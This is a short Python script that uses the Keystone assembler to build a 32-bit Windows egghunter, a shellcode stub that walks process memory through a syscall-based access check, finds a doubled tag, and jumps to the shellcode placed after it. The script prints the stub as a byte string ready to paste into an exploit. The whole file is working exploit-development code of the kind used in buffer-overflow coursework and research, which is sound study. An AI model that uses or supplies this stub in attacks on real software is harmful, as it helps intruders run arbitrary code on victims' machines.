#!/usr/bin/python3
import argparse
import keystone as ks

def tag_to_hex(s):
    retval = list()
    for char in s:
        retval.append(hex(ord(char)).replace('0x', ''))
    return '0x' + ''.join(retval[::-1])

def main(args):

    egghunter = f"""
    loop_inc_page:
        or dx, 0x0fff
    loop_inc_one:
        inc edx
    loop_check:
        push edx
        xor eax, eax
        add ax, 0x01c6
        int 0x2e
        cmp al, 05
        pop edx
    loop_check_valid:
        je loop_inc_page
    is_egg:
        mov eax, {tag_to_hex(args.tag)}
        mov edi, edx
        scasd
        jnz loop_inc_one
    first_half_found:
        scasd
        jnz loop_inc_one
    matched_both_halves:
        jmp edi
    """

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    encoding, count = eng.asm(egghunter)

    print('egghunter = b"', end='')

    for enc in encoding:
        print("\\x{0:02x}".format(enc), end='')

    print('"')
    print(f"egghunter created:\n  len: {len(encoding)} bytes\n  tag: {args.tag * 2}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--tag', help='tag for which the egghunter will search', default='c0d3')
    
    args = parser.parse_args()

    main(args)
